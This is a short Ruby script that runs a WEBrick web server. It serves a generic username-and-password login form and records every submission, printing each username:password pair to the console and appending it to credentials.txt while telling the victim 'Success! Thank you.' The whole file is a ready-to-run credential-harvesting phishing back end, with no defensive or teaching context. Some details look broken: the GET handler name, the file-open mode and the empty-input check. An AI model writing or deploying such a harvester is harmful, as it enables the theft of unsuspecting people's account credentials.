#!/usr/bin/env ruby

require 'webrick'

class RubyServlet < WEBrick::HTTPServlet::AbstractServlet

  #control 'GET' request/response
  def do_Get(req, res)
    res.status = 200
    res['Content-Type']  = "text/html; charset=UTF-8"
    res['Server']        = "Ruby webServer"
    res['Cache-Control'] = "no-store, no-cache,"
    res.body             = print_login(req)
  end


  private
  #login
  def print_login(req)
    html = %q{
      <center>
        <table cellpadding="3" border="1">
        <tr><td colspan="2"><center><h4><b>Enter your Username and Password</b></h4></center></td></tr>
        <form method="POST" action="/login">
                <tr><td><strong><b>Username:</b></strong></td><td><input name="username" type="text"></td></tr>
                <tr><td><strong><b>Password:</b></strong></td><td><input name="password" type="password"></td></tr>
                <tr><td colspan="2"><center><h1><b><input type="submit" value="Login" /></b></h1></center></td></tr>
        </form>
        </table>
      </center>
    }
  end

end


class Login < WEBrick::HTTPServlet::AbstractServlet

  #control 'POST' request/response
  def do_POST(req, res)
    status, content_type, body = save_login(req)
    res.body = body
  end


  #save POST request
  def save_login(req)
    username, password = req.query['username'], req.query['password']

    if !(username && password).empty?
      #Print credentials to console
      puts "\n-----[ START OF POST ]-----"
      puts "[+] #{username}:#{password}"
      puts "-----[ END OF POST ]-----\n\n"
      #write Credentials to file
      File.open("credentials.txt", '+a') {|f| f.puts "#{username}:#{password}"}
      return 200, 'text/plain', 'Success! Thank you.'
    else
      puts "[!] Empty username and password"
      return 404, 'text/plain', 'Please enter correct Username and Password!'
    end

  end
end


begin
  port = ARGV[0]
  raise if ARGV.size < 1

  #start web server
  puts "[+] Starting HTTP server on port: #{port}\n"
  server = WEBrick::HTTPServer.new(ServerName: "Ruby Server",
                                   Port: port,
                                   BindAddress: '0.0.0.0',
                                   AccessLog: [],
                                   Logger: WEBrick::Log.new(File.open(File::NULL, 'w'))
                                  )
  server.mount("/", RubyServlet)
  server.mount("/login", Login)
  trap "INT" do server.shutdown end
  server.start

rescue Exception => e
  puts "#{__FILE__} <PORT>" if ARGV.size < 1
  puts e, e.backtrace
  exit 0
end
